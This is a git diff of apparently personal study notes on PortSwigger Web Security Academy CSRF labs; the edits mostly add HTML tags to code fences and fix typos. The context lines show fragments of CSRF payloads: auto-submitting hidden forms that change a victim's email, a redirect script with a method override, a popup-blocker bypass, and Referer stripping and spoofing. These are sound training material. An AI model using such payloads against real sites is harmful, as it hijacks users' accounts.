@@ -24,7 +24,7 @@ In order for a CSRF attack to be possible:
 ![[Pasted image 20240920205439.png]]
 
 - HTML payload (form action= "https://HOST/POST")
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -80,12 +80,12 @@ Testing CSRF Tokens:
 ![[Pasted image 20240920210450.png]]
 
 - HTML payload (form action="https://HOST/POST")
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
         <iframe style="display:none" name="csrf-iframe"></iframe>
-        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="GET" target="csrf-iframe" id="csrf-form">
+        <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="POST" target="csrf-iframe" id="csrf-form">
             <input type="hidden" name="email" value="test5@test.ca">
         </form>
 
@@ -135,7 +135,7 @@ Testing CSRF Tokens:
 ![[Pasted image 20240921183005.png]]
 
 - HTML payload (form action="https://HOST/POST")
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -184,7 +184,7 @@ Testing CSRF Tokens:
 			if is accepted --> the csrf token is not tied to the user's session 
 
 - HTML payload:
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -259,7 +259,7 @@ In order to exploit this vulnerability, we need to perform 2 things:
 
 - HTML payload (form action= https://HOST/POST (change email request - first tab) | 
                img src= https://HOST/POST(injected header - second tab) )
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -318,12 +318,12 @@ In order to exploit this vulnerability, we need to perform 2 things:
 ![[Pasted image 20240922012718.png]]
 ![[Pasted image 20240922012739.png]]
 
-- we will inject to cookie header trough the search set cookie value which will be equal to the csrf token (first tab)
+- we will inject to cookie header trough the search set cookie, value which will be equal to the csrf token (first tab)
 ![[Pasted image 20240922013015.png]]
 
 - HTML payload (form action= https://HOST/POST (change email request - first tab) | 
                img src= https://HOST/POST(injected header - second tab) )
-```
+```html
 <html>
     <body>
         <h1>Hello World!</h1>
@@ -375,7 +375,7 @@ python3 -m http.server <port-number>
 	![[Pasted image 20240924115507.png]]
 	
 - HTML/Javascript payload (document.location="https://HOST/GET")
-```
+```html
 <script>
     document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
 </script>
@@ -469,7 +469,7 @@ document.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/conf
 ##### Attempt a CSRF attack
 1. In the browser, go to the exploit server.
 2. Use the following template to create a basic CSRF attack for changing the victim's email address:
-```
+```html
 <script>
     history.pushState('', '', '/')
 </script>
@@ -493,7 +493,8 @@ document.location=https://YOUR-LAB-ID.web-security-academy.net/post/comment/conf
 2. From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.
 3. Go back to the exploit server.
 4. Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. The following is one possible approach:
-```
+   
+```html
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="pwned@web-security-academy.net">
 </form>
@@ -512,11 +513,10 @@ Note that we've opened the `/social-login` in a new window to avoid navigating
 5. Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.  
 6. Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.
 
-
 ##### Bypass the popup blocker
 1. Realize that the popup is being blocked because you haven't manually interacted with the page.
 2. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
-```
+```html
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="pwned@portswigger.net">
 </form>
@@ -571,7 +571,7 @@ Testing Referer header for CSRF attacks:
 - we can spoof the referer header or to remove it and if the request is accepted without it we are ready to go; 
 
 - Payload:
-```
+```html
 <html>
     <head>
         <meta name="referrer" content="never">        REMOVING THE REFERRER HEADER
@@ -625,7 +625,7 @@ Testing Referer header for CSRF attacks:
 	![[Pasted image 20240925185052.png]]
 
 - checking which portion of the referrer header is validated in the backend and we observe that if we are changing the first part the request is still accepted --> `LAB-ID.web-security-academy.net` is compared by the backend server
-```
+```html
 https://paein-example-domain.com/?LAB-ID.web-security-academy.net`
 ```
 
@@ -633,8 +633,8 @@ Note:
 	`/?` - this represents a domain query parameter 
 	![[Pasted image 20240925185342.png]]
 
-- Payload(using the query parameter we append the valid part of the refferer to our url in order to match the original one by the backend):
-```
+- Payload(using the query parameter we append the valid part of the referer to our url in order to match the original one by the backend):
+```html
 <html>
     <body>
     
